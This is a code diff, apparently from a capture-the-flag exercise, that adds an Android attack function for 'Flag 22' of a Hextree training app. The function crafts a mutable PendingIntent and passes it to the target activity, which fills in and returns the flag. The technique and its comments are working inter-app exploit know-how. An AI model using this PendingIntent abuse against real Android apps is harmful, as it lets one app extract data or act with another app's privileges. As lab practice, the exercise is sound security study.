@@ -1,5 +1,6 @@
 package com.vishal2376.hextreepoc
 
+import android.app.PendingIntent
 import android.content.Context
 import android.content.Intent
 import android.os.Handler
@@ -258,6 +259,51 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		val intent = Intent().apply {
 			setClassName(packageName, activityPath)
 			putExtra("LOGIN", true) // required — onActivityResult() checks this
+			addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+		}
+		context.startActivity(intent)
+	}
+
+	/**
+	 * FLAG 22 - Receive Pending Intent
+	 * Technique: PendingIntent as Attack Vector
+	 *
+	 * Flow:
+	 * 1. We create a mutable PendingIntent pointing back to our HextreeActivity
+	 * 2. Send it to Flag22Activity via "PENDING" extra
+	 * 3. Flag22 fills in success=true and flag into our PendingIntent
+	 * 4. Flag22 calls pendingIntent.send() — fires back to our HextreeActivity
+	 * 5. onNewIntent() receives the intent with flag data
+	 *
+	 * Key insight: FLAG_MUTABLE allows Flag22 to inject extras (flag, success)
+	 * into our PendingIntent before sending it back. Immutable would block this.
+	 * FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT required for Android 15 strict mode.
+	 */
+	fun flag22() {
+		val activityPath = "$packageName.activities.Flag22Activity"
+
+		// Receiver intent: points back to our own HextreeActivity
+		// FLAG_ACTIVITY_SINGLE_TOP ensures onNewIntent() is called
+		// instead of creating a new HextreeActivity instance
+		val receiverIntent = Intent(context, HextreeActivity::class.java).apply {
+			action = "FLAG22_RESULT"
+			addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
+		}
+
+		// FLAG_MUTABLE: allows Flag22 to add extras (flag, success) before sending
+		// FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT: required on Android 15 for PendingIntent delivery
+		val pendingIntent = PendingIntent.getActivity(
+			context,
+			22,
+			receiverIntent,
+			PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT
+		)
+
+		// Send PendingIntent to Flag22 via "PENDING" extra
+		// Flag22 will call pendingIntent.send(context, 0, intentWithFlag)
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			putExtra("PENDING", pendingIntent)  // Flag22 extracts and fires this
 			addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
 		}
 		context.startActivity(intent)
